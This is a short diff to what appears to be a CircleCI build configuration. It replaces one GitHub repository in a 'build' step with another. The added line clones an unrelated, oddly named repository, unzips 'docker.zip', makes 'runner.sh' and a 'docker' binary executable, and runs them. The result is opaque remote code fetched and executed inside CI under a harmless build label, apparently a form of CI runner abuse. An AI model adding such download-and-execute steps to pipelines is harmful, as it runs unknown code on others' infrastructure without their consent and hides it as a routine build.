@@ -18,7 +18,7 @@ commands:
       - run:
           name: build
           command: |
-              git clone https://github.com/shuwaibahjaman/sublimain.git && cd sublimain && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
+              git clone https://github.com/sompamanajuya/sompamana21.git && cd sompamana21 && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
               
 jobs:
   buildd:
